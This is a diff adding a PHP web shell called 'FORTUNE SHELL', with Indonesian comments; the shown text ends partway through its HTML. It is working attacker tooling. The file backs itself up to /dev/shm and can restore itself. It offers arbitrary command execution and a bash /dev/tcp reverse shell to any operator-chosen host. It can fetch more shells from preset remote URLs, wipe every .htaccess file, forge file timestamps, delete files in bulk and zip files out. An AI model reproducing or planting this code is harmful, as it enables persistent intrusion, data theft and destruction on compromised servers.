@@ -1,0 +1,874 @@
+<?php
+/**
+ * FORTUNE SHELL - LUXURY COMPLETE EDITION
+ * Semua fitur original tetep ada + tampilan premium
+ */
+
+error_reporting(E_ALL);
+ini_set('display_errors', 1);
+
+// ================== KONFIGURASI ==================
+$CONFIG_ROOT   = '/';
+$PASSWORD_HASH = '$2a$12$N8d4JcDJP8YiEYqWoFnEf.JjkIki0LHhdFQLOopdk81s6LdPme8F6';
+$AUTH_COOKIE   = 'fm_auth_token';
+$TOKEN_EXPIRY  = 60 * 60 * 24 * 30;
+
+// Backup path
+$backup = '/dev/shm/session.txt';
+
+// Backup diri sendiri
+if (file_exists(__FILE__) && !file_exists($backup)) {
+    file_put_contents($backup, file_get_contents(__FILE__));
+}
+
+// Restore via ?r
+if (isset($_GET['r']) && !file_exists(__FILE__) && file_exists($backup)) {
+    copy($backup, __FILE__);
+    chmod(__FILE__, 0755);
+    echo "Restored";
+    exit;
+}
+
+// ================== FUNGSI CORE ==================
+function cleanPath($path) {
+    if ($path === null || $path === '') return getcwd();
+    $path = str_replace(['\\', '..', './'], ['/', '', '/'], $path);
+    $path = preg_replace('#/+#', '/', $path);
+    if (strpos($path, '/../') !== false || strpos($path, '..') === 0) return getcwd();
+    if (!empty($path) && !is_dir($path) && !is_file($path)) {
+        $parent = dirname($path);
+        if (is_dir($parent)) return $parent;
+        return getcwd();
+    }
+    return $path ?: getcwd();
+}
+
+function is_authenticated() {
+    global $AUTH_COOKIE, $PASSWORD_HASH;
+    if (!isset($_COOKIE[$AUTH_COOKIE])) return false;
+    $token = $_COOKIE[$AUTH_COOKIE];
+    $decoded = base64_decode($token);
+    if ($decoded === false || strpos($decoded, '|') === false) return false;
+    list($expiry, $hash) = explode('|', $decoded, 2);
+    if (time() > $expiry) return false;
+    $expected_hash = hash_hmac('sha256', $expiry, $PASSWORD_HASH);
+    return hash_equals($expected_hash, $hash);
+}
+
+function set_auth_cookie() {
+    global $AUTH_COOKIE, $PASSWORD_HASH, $TOKEN_EXPIRY;
+    $expiry = time() + $TOKEN_EXPIRY;
+    $hash = hash_hmac('sha256', $expiry, $PASSWORD_HASH);
+    $token = base64_encode($expiry . '|' . $hash);
+    setcookie($AUTH_COOKIE, $token, $expiry, '/', '', false, true);
+}
+
+function clear_auth_cookie() {
+    global $AUTH_COOKIE;
+    setcookie($AUTH_COOKIE, '', time() - 3600, '/');
+}
+
+function destroy_dir($dir) {
+    if (!is_dir($dir) || is_link($dir)) return @unlink($dir);
+    foreach (scandir($dir) as $file) {
+        if ($file == '.' || $file == '..') continue;
+        if (!destroy_dir($dir . DIRECTORY_SEPARATOR . $file)) {
+            @chmod($dir . DIRECTORY_SEPARATOR . $file, 0777);
+            if (!destroy_dir($dir . DIRECTORY_SEPARATOR . $file)) return false;
+        }
+    }
+    return @rmdir($dir);
+}
+
+function chmod_recursive($path, $mode, &$messages) {
+    if (!file_exists($path)) { $messages[] = "[FAIL] Target tidak ada: $path"; return; }
+    if (@chmod($path, $mode)) $messages[] = "[OK] Chmod: $path";
+    if (is_dir($path)) {
+        $items = @scandir($path);
+        if ($items) foreach ($items as $it) {
+            if ($it === '.' || $it === '..') continue;
+            chmod_recursive($path . DIRECTORY_SEPARATOR . $it, $mode, $messages);
+        }
+    }
+}
+
+function touch_recursive($path, $ts, &$messages) {
+    if (!file_exists($path)) return;
+    @touch($path, $ts);
+    if (is_dir($path)) {
+        $items = @scandir($path);
+        if ($items) foreach ($items as $it) {
+            if ($it === '.' || $it === '..') continue;
+            touch_recursive($path . DIRECTORY_SEPARATOR . $it, $ts, $messages);
+        }
+    }
+}
+
+function create_in_dirs_recursive($dirs, $name, $isFile, $content, &$messages) {
+    foreach ($dirs as $dirPath) {
+        $dirPath = cleanPath($dirPath);
+        if (!is_dir($dirPath)) continue;
+        $stack = [$dirPath];
+        while ($stack) {
+            $cur = array_pop($stack);
+            $dest = rtrim($cur, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . $name;
+            if ($isFile) {
+                if (!file_exists($dest) && file_put_contents($dest, $content)) {
+                    $messages[] = "[OK] File: $dest";
+                }
+            } else {
+                if (!file_exists($dest) && @mkdir($dest, 0777)) {
+                    $messages[] = "[OK] Folder: $dest";
+                }
+            }
+            $items = @scandir($cur);
+            if ($items) foreach ($items as $it) {
+                if ($it === '.' || $it === '..') continue;
+                $child = $cur . DIRECTORY_SEPARATOR . $it;
+                if (is_dir($child)) $stack[] = $child;
+            }
+        }
+    }
+}
+
+function delete_htaccess_all($basePath, &$messages) {
+    $stack = [$basePath];
+    while ($stack) {
+        $cur = array_pop($stack);
+        $htaccess = $cur . DIRECTORY_SEPARATOR . '.htaccess';
+        if (file_exists($htaccess) && @unlink($htaccess)) {
+            $messages[] = "[OK] Hapus .htaccess: $cur";
+        }
+        $items = @scandir($cur);
+        if ($items) foreach ($items as $it) {
+            if ($it === '.' || $it === '..') continue;
+            $child = $cur . DIRECTORY_SEPARATOR . $it;
+            if (is_dir($child)) $stack[] = $child;
+        }
+    }
+}
+
+function zip_paths($paths, $zipFile, &$messages) {
+    if (!class_exists('ZipArchive')) { $messages[] = "ZipArchive tidak ada"; return false; }
+    $zip = new ZipArchive();
+    if ($zip->open($zipFile, ZipArchive::CREATE | ZipArchive::OVERWRITE) !== true) return false;
+    foreach ($paths as $p) {
+        if (is_dir($p)) {
+            $base = basename($p);
+            $it = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($p, RecursiveDirectoryIterator::SKIP_DOTS), RecursiveIteratorIterator::SELF_FIRST);
+            foreach ($it as $file) {
+                $relPath = $base . '/' . substr($file->getPathname(), strlen($p) + 1);
+                if ($file->isDir()) $zip->addEmptyDir($relPath);
+                else $zip->addFile($file->getPathname(), $relPath);
+            }
+        } elseif (is_file($p)) {
+            $zip->addFile($p, basename($p));
+        }
+    }
+    $zip->close();
+    return true;
+}
+
+function send_download($path, $downloadName) {
+    if (!file_exists($path)) return false;
+    ob_clean();
+    header('Content-Type: application/octet-stream');
+    header('Content-Disposition: attachment; filename="' . $downloadName . '"');
+    header('Content-Length: ' . filesize($path));
+    readfile($path);
+    return true;
+}
+
+function customSort($a, $b) {
+    $isDirA = is_dir($a['fullpath']);
+    $isDirB = is_dir($b['fullpath']);
+    if ($isDirA && !$isDirB) return -1;
+    if (!$isDirA && $isDirB) return 1;
+    return strcasecmp($a['name'], $b['name']);
+}
+
+// Presets URL
+$presets = [
+    'ALFA ONI' => 'https://raw.githubusercontent.com/tuman88936/tumankan/refs/heads/main/obs1.txt',
+    'ALFA OBS' => 'https://obeydasupreme.site/shell/obs1.txt',
+    'ALFA RUDY' => 'https://raw.githubusercontent.com/tuman88936/tumankan/refs/heads/main/papikeng.php',
+    'ALFA ANTIWAF 1' => 'https://raw.githubusercontent.com/tuman88936/tumankan/refs/heads/main/alfashells.txt',
+    'LOOSER' => 'https://raw.githubusercontent.com/tuman88936/tumankan/refs/heads/main/looser1.txt',
+    'TINY' => 'https://obeydasupreme.site/shell/obstiny.txt',
+    'GECKO' => 'https://obeydasupreme.site/shell/obsgecko.txt',
+    'ADMINER' => 'https://raw.githubusercontent.com/yourfr13nds/backburner/main/adminer.php',
+];
+
+// ================== LOGIN HANDLER ==================
+$error = '';
+if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['fm_login_pass'])) {
+    $pass = (string)($_POST['fm_login_pass']);
+    if (password_verify($pass, $PASSWORD_HASH)) {
+        set_auth_cookie();
+        header("Location: " . $_SERVER['PHP_SELF']);
+        exit;
+    } else {
+        $error = "Password salah.";
+    }
+}
+
+if (isset($_GET['logout'])) {
+    clear_auth_cookie();
+    header("Location: " . strtok($_SERVER['PHP_SELF'], '?'));
+    exit;
+}
+
+$isAuth = is_authenticated();
+
+// TAMPILAN LOGIN
+if (!$isAuth) {
+    ?>
+    <!DOCTYPE html>
+    <html>
+    <head>
+        <meta charset="UTF-8">
+        <title>FORTUNE SHELL | Login</title>
+        <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+        <style>
+            * { margin: 0; padding: 0; box-sizing: border-box; }
+            body {
+                background: linear-gradient(135deg, #0f172a 0%, #020617 100%);
+                font-family: 'Inter', sans-serif;
+                min-height: 100vh;
+                display: flex;
+                align-items: center;
+                justify-content: center;
+            }
+            .login-container {
+                background: rgba(15, 23, 42, 0.8);
+                backdrop-filter: blur(20px);
+                border-radius: 32px;
+                border: 1px solid rgba(56, 189, 248, 0.2);
+                padding: 48px 40px;
+                width: 420px;
+            }
+            .logo-icon {
+                width: 56px;
+                height: 56px;
+                background: linear-gradient(135deg, #38bdf8, #0ea5e9);
+                border-radius: 18px;
+                margin: 0 auto 16px;
+                display: flex;
+                align-items: center;
+                justify-content: center;
+                font-size: 32px;
+            }
+            h2 { color: #f1f5f9; font-size: 24px; text-align: center; margin-bottom: 8px; }
+            .sub { color: #94a3b8; font-size: 14px; text-align: center; margin-bottom: 32px; }
+            input {
+                width: 100%;
+                padding: 14px 18px;
+                background: rgba(2, 6, 23, 0.8);
+                border: 1px solid #1e293b;
+                border-radius: 14px;
+                color: #e2e8f0;
+                font-size: 15px;
+            }
+            input:focus { outline: none; border-color: #38bdf8; }
+            button {
+                width: 100%;
+                padding: 14px;
+                background: linear-gradient(135deg, #38bdf8, #0ea5e9);
+                border: none;
+                border-radius: 14px;
+                color: white;
+                font-size: 15px;
+                font-weight: 600;
+                cursor: pointer;
+                margin-top: 16px;
+            }
+            .error { color: #f87171; font-size: 13px; text-align: center; margin-top: 16px; }
+        </style>
+    </head>
+    <body>
+        <div class="login-container">
+            <div class="logo-icon">⚡</div>
+            <h2>FORTUNE SHELL</h2>
+            <div class="sub">Luxury Complete Edition</div>
+            <form method="post">
+                <input type="password" name="fm_login_pass" placeholder="Enter password" autofocus>
+                <button type="submit">Access Panel →</button>
+                <?php if ($error): ?>
+                    <div class="error"><?php echo htmlspecialchars($error); ?></div>
+                <?php endif; ?>
+            </form>
+        </div>
+    </body>
+    </html>
+    <?php
+    exit;
+}
+
+// ================== MAIN LOGIC ==================
+$pwd = isset($_GET['pwd']) ? cleanPath($_GET['pwd']) : getcwd();
+$messages = [];
+$editFile = isset($_GET['edit']) ? basename($_GET['edit']) : '';
+$terminalOut = '';
+$parent = dirname($pwd);
+
+// Handle POST actions (SEMUA FITUR)
+if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+    $action = $_POST['action'] ?? '';
+    
+    if ($action === 'terminal_exec') {
+        $cmd = trim($_POST['terminal_cmd'] ?? '');
+        if ($cmd) {
+            $fullCmd = 'cd ' . escapeshellarg($pwd) . ' && ' . $cmd . ' 2>&1';
+            $terminalOut = shell_exec($fullCmd) ?: "[No output]";
+        }
+    }
+    elseif ($action === 'mass_delete') {
+        foreach (($_POST['file_targets'] ?? []) as $f) {
+            $path = $pwd . DIRECTORY_SEPARATOR . basename($f);
+            if (is_file($path) && @unlink($path)) $messages[] = "✅ Deleted: $f";
+        }
+        foreach (($_POST['dir_targets'] ?? []) as $d) {
+            if (is_dir($d) && destroy_dir($d)) $messages[] = "✅ Deleted dir: " . basename($d);
+        }
+    }
+    elseif ($action === 'delete_htaccess_all') {
+        delete_htaccess_all($pwd, $messages);
+    }
+    elseif ($action === 'create_file_flat') {
+        $name = basename($_POST['new_file_name'] ?? '');
+        $content = $_POST['new_file_content'] ?? '';
+        if ($name) {
+            $dest = $pwd . DIRECTORY_SEPARATOR . $name;
+            if (file_put_contents($dest, $content)) $messages[] = "✅ Created: $name";
+            else $messages[] = "❌ Failed: $name";
+        }
+    }
+    elseif ($action === 'create_file_recursive') {
+        $name = basename($_POST['new_file_name'] ?? '');
+        $content = $_POST['new_file_content'] ?? '';
+        $dirs = $_POST['dir_targets'] ?? [];
+        if ($name && $dirs) create_in_dirs_recursive($dirs, $name, true, $content, $messages);
+    }
+    elseif ($action === 'create_folder_flat') {
+        $name = basename($_POST['new_folder_name'] ?? '');
+        if ($name && @mkdir($pwd . DIRECTORY_SEPARATOR . $name, 0777)) {
+            $messages[] = "✅ Folder created: $name";
+        }
+    }
+    elseif ($action === 'create_folder_recursive') {
+        $name = basename($_POST['new_folder_name'] ?? '');
+        $dirs = $_POST['dir_targets'] ?? [];
+        if ($name && $dirs) create_in_dirs_recursive($dirs, $name, false, '', $messages);
+    }
+    elseif ($action === 'rename_save_mass') {
+        $renameVals = $_POST['rename_val'] ?? [];
+        foreach ($renameVals as $old => $new) {
+            $new = trim($new);
+            if ($new && $new !== $old) {
+                $from = $pwd . DIRECTORY_SEPARATOR . basename($old);
+                $to = $pwd . DIRECTORY_SEPARATOR . basename($new);
+                if (@rename($from, $to)) $messages[] = "✅ Renamed: $old → $new";
+            }
+        }
+    }
+    elseif (strpos($action, 'delete_one:') === 0) {
+        $name = basename(substr($action, 11));
+        $path = $pwd . DIRECTORY_SEPARATOR . $name;
+        if (@unlink($path)) $messages[] = "✅ Deleted: $name";
+    }
+    elseif (strpos($action, 'delete_dir_one:') === 0) {
+        $dirPath = substr($action, 16);
+        if (destroy_dir($dirPath)) $messages[] = "✅ Deleted dir: " . basename($dirPath);
+    }
+    elseif (strpos($action, 'rename_dir_one:') === 0) {
+        $parts = explode('|', substr($action, 15), 2);
+        if (count($parts) == 2) {
+            $oldPath = $parts[0];
+            $newName = basename(trim($parts[1]));
+            if ($newName) {
+                $newPath = dirname($oldPath) . DIRECTORY_SEPARATOR . $newName;
+                if (@rename($oldPath, $newPath)) $messages[] = "✅ Renamed dir: " . basename($oldPath) . " → $newName";
+            }
+        }
+    }
+    elseif ($action === 'edit_save') {
+        $file = basename($_POST['edit_file'] ?? '');
+        $content = $_POST['file_content'] ?? '';
+        $path = $pwd . DIRECTORY_SEPARATOR . $file;
+        if (file_put_contents($path, $content)) $messages[] = "✅ Saved: $file";
+        else $messages[] = "❌ Save failed";
+    }
+    elseif ($action === 'deploy_upload') {
+        $target = basename($_POST['target_name_upload'] ?? '');
+        if (isset($_FILES['src_file']) && $target && move_uploaded_file($_FILES['src_file']['tmp_name'], $pwd . DIRECTORY_SEPARATOR . $target)) {
+            $messages[] = "✅ Uploaded: $target";
+        }
+    }
+    elseif ($action === 'deploy_url') {
+        $url = trim($_POST['src_url'] ?? '');
+        $target = basename($_POST['target_name_url'] ?? '');
+        if ($url && $target) {
+            $data = @file_get_contents($url);
+            if ($data && file_put_contents($pwd . DIRECTORY_SEPARATOR . $target, $data)) {
+                $messages[] = "✅ Downloaded: $target";
+            } else $messages[] = "❌ Download failed";
+        }
+    }
+    elseif ($action === 'chmod_apply_flat') {
+        $mode = octdec(trim($_POST['chmod_mode'] ?? '0755'));
+        foreach (($_POST['file_targets'] ?? []) as $f) {
+            $path = $pwd . DIRECTORY_SEPARATOR . basename($f);
+            if (@chmod($path, $mode)) $messages[] = "✅ Chmod $f";
+        }
+        foreach (($_POST['dir_targets'] ?? []) as $d) {
+            if (@chmod($d, $mode)) $messages[] = "✅ Chmod dir: " . basename($d);
+        }
+    }
+    elseif ($action === 'chmod_apply_recursive') {
+        $mode = octdec(trim($_POST['chmod_mode'] ?? '0755'));
+        foreach (($_POST['file_targets'] ?? []) as $f) {
+            chmod_recursive($pwd . DIRECTORY_SEPARATOR . basename($f), $mode, $messages);
+        }
+        foreach (($_POST['dir_targets'] ?? []) as $d) {
+            chmod_recursive($d, $mode, $messages);
+        }
+    }
+    elseif ($action === 'time_apply_flat') {
+        $ts = strtotime($_POST['time_value'] ?? '');
+        if ($ts) {
+            foreach (($_POST['file_targets'] ?? []) as $f) {
+                @touch($pwd . DIRECTORY_SEPARATOR . basename($f), $ts);
+            }
+            foreach (($_POST['dir_targets'] ?? []) as $d) {
+                @touch($d, $ts);
+            }
+            $messages[] = "✅ Time updated";
+        }
+    }
+    elseif ($action === 'time_apply_recursive') {
+        $ts = strtotime($_POST['time_value'] ?? '');
+        if ($ts) {
+            foreach (($_POST['file_targets'] ?? []) as $f) {
+                touch_recursive($pwd . DIRECTORY_SEPARATOR . basename($f), $ts, $messages);
+            }
+            foreach (($_POST['dir_targets'] ?? []) as $d) {
+                touch_recursive($d, $ts, $messages);
+            }
+            $messages[] = "✅ Time updated recursive";
+        }
+    }
+    elseif ($action === 'reverse_ip') {
+        $ip = trim($_POST['reverse_ip'] ?? '');
+        $port = trim($_POST['reverse_port'] ?? '');
+        if ($ip && $port) {
+            $cmd = "bash -c \"exec 5<>/dev/tcp/{$ip}/{$port}; cat <&5 | while read line; do \$line 2>&5 >&5; done\" &";
+            @shell_exec($cmd);
+            $messages[] = "🔥 Reverse shell sent to $ip:$port";
+        }
+    }
+    elseif ($action === 'custom_path') {
+        $newPath = cleanPath(trim($_POST['custom_root'] ?? ''));
+        if (is_dir($newPath)) {
+            header("Location: " . $_SERVER['PHP_SELF'] . "?pwd=" . urlencode($newPath));
+            exit;
+        }
+    }
+    elseif ($action === 'download_selected') {
+        $paths = [];
+        foreach (($_POST['file_targets'] ?? []) as $f) {
+            $p = $pwd . DIRECTORY_SEPARATOR . basename($f);
+            if (file_exists($p)) $paths[] = $p;
+        }
+        foreach (($_POST['dir_targets'] ?? []) as $d) {
+            if (is_dir($d)) $paths[] = $d;
+        }
+        if ($paths) {
+            $zipName = 'download_' . date('Ymd_His') . '.zip';
+            $zipPath = sys_get_temp_dir() . DIRECTORY_SEPARATOR . $zipName;
+            if (zip_paths($paths, $zipPath, $messages)) {
+                send_download($zipPath, $zipName);
+                @unlink($zipPath);
+                exit;
+            }
+        }
+    }
+}
+
+// Baca isi folder
+$items = [];
+if ($scan = @scandir($pwd)) {
+    foreach ($scan as $it) {
+        if ($it === '.' || $it === '..') continue;
+        $items[] = ['name' => $it, 'fullpath' => $pwd . DIRECTORY_SEPARATOR . $it];
+    }
+    usort($items, 'customSort');
+}
+
+$editContent = '';
+if ($editFile && is_file($pwd . DIRECTORY_SEPARATOR . $editFile)) {
+    $editContent = file_get_contents($pwd . DIRECTORY_SEPARATOR . $editFile);
+}
+
+$uname = php_uname();
+$phpVersion = PHP_VERSION;
+$yourIp = $_SERVER['REMOTE_ADDR'] ?? 'local';
+$diskFree = disk_free_space('/') ? round(disk_free_space('/') / 1024 / 1024 / 1024, 2) : 0;
+$diskTotal = disk_total_space('/') ? round(disk_total_space('/') / 1024 / 1024 / 1024, 2) : 0;
+?>
+
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>FORTUNE SHELL · Luxury Complete</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;14..32,400;14..32,500;14..32,600;14..32,700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            background: radial-gradient(circle at 20% 30%, #0f172a, #020617);
+            font-family: 'Inter', sans-serif;
+            padding: 24px;
+            color: #e2e8f0;
+        }
+        .container { max-width: 1600px; margin: 0 auto; }
+        .card {
+            background: rgba(15, 23, 42, 0.6);
+            backdrop-filter: blur(12px);
+            border: 1px solid rgba(56, 189, 248, 0.15);
+            border-radius: 24px;
+            padding: 24px;
+            margin-bottom: 20px;
+        }
+        .card-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 20px;
+            flex-wrap: wrap;
+            gap: 12px;
+        }
+        .card-title {
+            font-size: 13px;
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            color: #38bdf8;
+        }
+        .stats-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 12px;
+            margin-bottom: 20px;
+        }
+        .stat-item {
+            background: rgba(2, 6, 23, 0.6);
+            border-radius: 16px;
+            padding: 12px 16px;
+            border: 1px solid #1e293b;
+        }
+        .stat-label { font-size: 11px; color: #94a3b8; text-transform: uppercase; margin-bottom: 6px; }
+        .stat-value { font-size: 13px; font-weight: 500; font-family: monospace; word-break: break-all; }
+        .btn {
+            background: rgba(56, 189, 248, 0.1);
+            border: 1px solid rgba(56, 189, 248, 0.3);
+            border-radius: 12px;
+            padding: 8px 16px;
+            color: #e2e8f0;
+            font-size: 12px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: all 0.2s;
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+        }
+        .btn:hover { background: rgba(56, 189, 248, 0.2); border-color: #38bdf8; }
+        .btn-danger { border-color: rgba(239, 68, 68, 0.4); background: rgba(239, 68, 68, 0.1); }
+        .btn-danger:hover { border-color: #ef4444; background: rgba(239, 68, 68, 0.2); }
+        .btn-primary { background: rgba(56, 189, 248, 0.2); border-color: #38bdf8; }
+        input, textarea, select {
+            background: #0f172a;
+            border: 1px solid #1e293b;
+            border-radius: 12px;
+            padding: 10px 14px;
+            color: #e2e8f0;
+            font-size: 13px;
+            font-family: 'Inter', monospace;
+        }
+        input:focus, textarea:focus { outline: none; border-color: #38bdf8; }
+        .file-table { width: 100%; border-collapse: collapse; }
+        .file-table th { text-align: left; padding: 12px 8px; font-size: 11px; font-weight: 600; color: #94a3b8; border-bottom: 1px solid #1e293b; }
+        .file-table td { padding: 10px 8px; border-bottom: 1px solid #1e293b; font-size: 13px; }
+        .file-table tr:hover { background: rgba(56, 189, 248, 0.05); }
+        .folder-link { color: #38bdf8; font-weight: 500; text-decoration: none; }
+        .badge { font-size: 10px; padding: 2px 8px; border-radius: 20px; background: #1e293b; }
+        .term-output {
+            background: #020617;
+            border-radius: 12px;
+            padding: 12px;
+            font-family: monospace;
+            font-size: 12px;
+            margin-top: 12px;
+            white-space: pre-wrap;
+            max-height: 300px;
+            overflow: auto;
+        }
+        .flex { display: flex; gap: 8px; flex-wrap: wrap; align-items: center; }
+        .grid-2cols { display: grid; grid-template-columns: 1fr 1fr; gap: 16px; }
+        @media (max-width: 768px) { .grid-2cols { grid-template-columns: 1fr; } }
+        i { margin-right: 4px; }
+        hr { border-color: #1e293b; margin: 16px 0; }
+    </style>
+</head>
+<body>
+<div class="container">
+    <!-- Header -->
+    <div class="card">
+        <div class="card-header">
+            <div>
+                <span style="font-size: 28px; font-weight: 700; background: linear-gradient(135deg,#38bdf8,#818cf8); -webkit-background-clip: text; background-clip: text; color: transparent;">FORTUNE SHELL</span>
+                <span style="font-size: 12px; margin-left: 12px; background: #1e293b; padding: 2px 8px; border-radius: 20px;">COMPLETE LUXURY</span>
+            </div>
+            <div class="flex">
+                <span class="badge"><i class="fas fa-hdd"></i> <?php echo $diskFree; ?>GB / <?php echo $diskTotal; ?>GB</span>
+                <span class="badge"><i class="fas fa-globe"></i> <?php echo $yourIp; ?></span>
+                <a href="?logout=1" class="btn btn-danger"><i class="fas fa-sign-out-alt"></i> Logout</a>
+            </div>
+        </div>
+    </div>
+
+    <!-- System Info -->
+    <div class="stats-grid">
+        <div class="stat-item"><div class="stat-label"><i class="fas fa-microchip"></i> System</div><div class="stat-value"><?php echo substr($uname, 0, 60); ?></div></div>
+        <div class="stat-item"><div class="stat-label"><i class="fab fa-php"></i> PHP Version</div><div class="stat-value"><?php echo $phpVersion; ?></div></div>
+        <div class="stat-item"><div class="stat-label"><i class="fas fa-folder"></i> Current Path</div><div class="stat-value"><?php echo htmlspecialchars($pwd); ?></div></div>
+        <div class="stat-item"><div class="stat-label"><i class="fas fa-clock"></i> Restore Point</div><div class="stat-value"><a href="?r=1" class="btn" style="padding: 4px 12px;">Restore from backup</a></div></div>
+    </div>
+
+    <!-- Terminal + Path -->
+    <div class="card">
+        <div class="card-header">
+            <div class="card-title"><i class="fas fa-terminal"></i> COMMAND LINE</div>
+            <div class="flex">
+                <form method="post" style="margin:0;">
+                    <input type="text" name="custom_root" placeholder="Go to path..." style="width: 250px;">
+                    <button type="submit" name="action" value="custom_path" class="btn"><i class="fas fa-location-arrow"></i> Go</button>
+                </form>
+                <a href="?pwd=<?php echo urlencode($parent); ?>" class="btn"><i class="fas fa-level-up-alt"></i> Parent</a>
+            </div>
+        </div>
+        <form method="post">
+            <div class="flex" style="margin-bottom: 8px;">
+                <input type="text" name="terminal_cmd" placeholder="$ ls -la" style="flex: 1;">
+                <button type="submit" name="action" value="terminal_exec" class="btn"><i class="fas fa-play"></i> Run</button>
+            </div>
+            <?php if ($terminalOut): ?>
+                <div class="term-output">$ <?php echo htmlspecialchars($terminalOut); ?></div>
+            <?php endif; ?>
+        </form>
+    </div>
+
+    <!-- Quick Actions Grid -->
+    <div class="card">
+        <div class="card-title" style="margin-bottom: 16px;"><i class="fas fa-tools"></i> QUICK ACTIONS</div>
+        <div class="grid-2cols">
+            <!-- Kolom Kiri -->
+            <div>
+                <button class="btn" onclick="togglePanel('newFilePanel')"><i class="fas fa-file"></i> New File</button>
+                <button class="btn" onclick="togglePanel('newFolderPanel')"><i class="fas fa-folder"></i> New Folder</button>
+                <button class="btn" onclick="togglePanel('uploadPanel')"><i class="fas fa-upload"></i> Upload</button>
+                <button class="btn" onclick="togglePanel('urlPanel')"><i class="fas fa-link"></i> Deploy URL</button>
+                <button class="btn btn-primary" onclick="togglePanel('presetPanel')"><i class="fas fa-database"></i> Presets</button>
+                <button class="btn" onclick="togglePanel('reversePanel')"><i class="fas fa-share-alt"></i> Reverse Shell</button>
+            </div>
+            <!-- Kolom Kanan -->
+            <div>
+                <button class="btn" onclick="togglePanel('chmodPanel')"><i class="fas fa-key"></i> Chmod</button>
+                <button class="btn" onclick="togglePanel('timePanel')"><i class="fas fa-calendar-alt"></i> Modify Time</button>
+                <button class="btn" onclick="togglePanel('renamePanel')"><i class="fas fa-i-cursor"></i> Mass Rename</button>
+                <button type="submit" form="mainForm" name="action" value="download_selected" class="btn"><i class="fas fa-download"></i> ZIP Selected</button>
+                <button type="submit" form="mainForm" name="action" value="delete_htaccess_all" class="btn btn-danger" onclick="return confirm('Delete all .htaccess?')"><i class="fas fa-ban"></i> Delete .htaccess</button>
+                <button type="submit" form="mainForm" name="action" value="mass_delete" class="btn btn-danger" onclick="return confirm('Delete selected?')"><i class="fas fa-trash"></i> Mass Delete</button>
+            </div>
+        </div>
+
+        <!-- Panel New File -->
+        <div id="newFilePanel" style="display: none; margin-top: 20px;">
+            <form method="post">
+                <div class="flex" style="margin-bottom: 8px;">
+                    <input type="text" name="new_file_name" placeholder="filename.php" style="flex:1;">
+                    <button type="submit" name="action" value="create_file_flat" class="btn">Create</button>
+                    <button type="submit" name="action" value="create_file_recursive" class="btn" onclick="return confirm('Recursive ke folder tercentang?')">Recursive</button>
+                </div>
+                <textarea name="new_file_content" rows="4" placeholder="Write code here..."></textarea>
+            </form>
+        </div>
+        <div id="newFolderPanel" style="display: none; margin-top: 20px;">
+            <form method="post">
+                <div class="flex">
+                    <input type="text" name="new_folder_name" placeholder="folder_name" style="flex:1;">
+                    <button type="submit" name="action" value="create_folder_flat" class="btn">Create</button>
+                    <button type="submit" name="action" value="create_folder_recursive" class="btn" onclick="return confirm('Recursive ke folder tercentang?')">Recursive</button>
+                </div>
+            </form>
+        </div>
+        <div id="uploadPanel" style="display: none; margin-top: 20px;">
+            <form method="post" enctype="multipart/form-data">
+                <div class="flex">
+                    <input type="file" name="src_file">
+                    <input type="text" name="target_name_upload" placeholder="save as...">
+                    <button type="submit" name="action" value="deploy_upload" class="btn">Upload</button>
+                </div>
+            </form>
+        </div>
+        <div id="urlPanel" style="display: none; margin-top: 20px;">
+            <form method="post">
+                <div class="flex">
+                    <input type="text" name="src_url" placeholder="https://example.com/file.php" style="flex:1;">
+                    <input type="text" name="target_name_url" placeholder="filename.php">
+                    <button type="submit" name="action" value="deploy_url" class="btn">Download</button>
+                </div>
+            </form>
+        </div>
+        <div id="presetPanel" style="display: none; margin-top: 20px;">
+            <div class="flex" style="flex-wrap: wrap;">
+                <?php foreach ($presets as $key => $url): ?>
+                    <button type="button" class="btn" onclick="document.getElementById('src_url').value='<?php echo htmlspecialchars($url); ?>'; togglePanel('urlPanel');">
+                        <?php echo htmlspecialchars($key); ?>
+                    </button>
+                <?php endforeach; ?>
+            </div>
+        </div>
+        <div id="chmodPanel" style="display: none; margin-top: 20px;">
+            <form method="post">
+                <div class="flex">
+                    <input type="text" name="chmod_mode" placeholder="0755 or 0644" value="0755" style="width: 120px;">
+                    <button type="submit" name="action" value="chmod_apply_flat" class="btn">Apply (selected)</button>
+                    <button type="submit" name="action" value="chmod_apply_recursive" class="btn">Apply Recursive</button>
+                </div>
+            </form>
+        </div>
+        <div id="timePanel" style="display: none; margin-top: 20px;">
+            <form method="post">
+                <div class="flex">
+                    <input type="text" name="time_value" placeholder="2025-01-15 14:30:00" style="width: 200px;">
+                    <button type="submit" name="action" value="time_apply_flat" class="btn">Apply (selected)</button>
+                    <button type="submit" name="action" value="time_apply_recursive" class="btn">Apply Recursive</button>
+                </div>
+            </form>
+        </div>
+        <div id="renamePanel" style="display: none; margin-top: 20px;">
+            <div style="font-size: 12px; color: #94a3b8; margin-bottom: 8px;">
+                Centang file, isi kolom RENAME di tabel, lalu klik tombol di bawah
+            </div>
+            <button type="submit" form="mainForm" name="action" value="rename_save_mass" class="btn btn-primary">Save Mass Rename</button>
+        </div>
+        <div id="reversePanel" style="display: none; margin-top: 20px;">
+            <form method="post">
+                <div class="flex">
+                    <input type="text" name="reverse_ip" placeholder="IP Address">
+                    <input type="text" name="reverse_port" placeholder="Port">
+                    <button type="submit" name="action" value="reverse_ip" class="btn btn-danger">Start Reverse Shell</button>
+                </div>
+            </form>
+        </div>
+    </div>
+
+    <!-- File Manager Table -->
+    <div class="card">
+        <div class="card-header">
+            <div class="card-title"><i class="fas fa-folder-open"></i> FILE MANAGER</div>
